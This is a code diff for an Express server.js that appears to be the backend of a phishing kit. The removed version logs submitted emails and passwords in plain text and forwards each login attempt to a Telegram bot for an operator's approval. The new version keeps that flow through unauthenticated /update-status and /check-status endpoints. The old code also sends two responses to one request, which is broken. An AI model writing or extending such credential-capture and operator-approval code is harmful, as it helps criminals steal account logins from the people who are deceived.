@@ -1,7 +1,7 @@
-import express from "express";
-import cors from "cors";
-import bodyParser from "body-parser";
-import { startBot, setApprovalsStore, sendApprovalRequest } from "./bot.js";
+// server.js
+const express = require("express");
+const bodyParser = require("body-parser");
+const cors = require("cors");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -9,49 +9,28 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(bodyParser.json());
 
-// Shared store for approvals
-let approvals = {};
-setApprovalsStore(approvals);
+// In-memory store { email: status }
+const loginDecisions = {};
 
-// Start Telegram bot
-startBot();
-
-// POST route for login requests
-app.post("/", async (req, res) => {
-  try {
-    const { email, password, device, region } = req.body;
-    console.log("Login attempt:", { email, password, device, region });
-
-const identifier = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
-await sendApprovalRequest(email, identifier);
-
-res.json({ status: "pending", identifier });
-
-
-    // Poll until approved/rejected
-    const checkStatus = () => new Promise((resolve) => {
-      const interval = setInterval(() => {
-        if (approvals[identifier] && approvals[identifier].status !== "pending") {
-          clearInterval(interval);
-          resolve(approvals[identifier].status);
-        }
-      }, 500);
-    });
-
-    const status = await checkStatus();
-    res.json({ status });
-  } catch (err) {
-    console.error("Error handling login:", err);
-    res.status(500).json({ status: "error", message: "Internal server error" });
+// Called by bot.js when decision is made
+app.post("/update-status", (req, res) => {
+  const { email, status } = req.body;
+  if (!email || !status) {
+    return res.status(400).json({ error: "Missing email or status" });
   }
+  loginDecisions[email] = status;
+  res.json({ success: true });
 });
 
-// Health check
-app.get("/", (req, res) => {
-  res.send("Server is running");
+// Frontend polls here
+app.post("/check-status", (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: "Missing email" });
+
+  const status = loginDecisions[email] || "pending";
+  res.json({ status });
 });
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`✅ Server running on port ${PORT}`);
 });
-
